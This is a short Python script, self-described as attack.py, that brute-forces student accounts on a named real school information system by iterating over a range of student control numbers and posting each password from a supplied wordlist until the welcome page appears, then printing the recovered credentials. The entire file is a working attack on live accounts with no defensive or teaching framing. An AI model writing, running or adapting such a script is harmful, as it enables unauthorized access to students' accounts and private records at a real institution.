import requests
import sys


def get_credentials(no_control, password, home_page):
    return f'[{no_control}] [{password}]'


def find_password(no_control, passwords):
    url = 'http://sii.itq.edu.mx/sistema/index.php'
    welcome = 'http://sii.itq.edu.mx/sistema/modulos/alu/'
    data = {'no_de_control': no_control, 'password': ''}
    session = requests.session()
    for password in passwords:
        if password == '5123':
            print('No te desesperes...')
        data['password'] = password
        response = session.post(url, data).text
        if 'password' in response: continue

        home_page = session.get(welcome).text
        if 'Bienvenido' in home_page:
            return get_credentials(no_control, password, home_page)
    return f'Password not found for [{no_control}]'


def main():
    args = sys.argv
    if len(args) < 1:
        print('Usage: python3 attack.py {no_control_a} {no_control_b} < {passwords_file}')
        exit(1)

    no_control = int(args[1])
    final = no_control
    if len(args) > 2:
        final = int(args[2])

    passwords = [line.strip() for line in sys.stdin]
    print(f'Atacando...\nDesde: {no_control}\nHasta: {final}')
    while no_control <= final:
        result = find_password(no_control, passwords)
        print(result)
        no_control += 1

main()
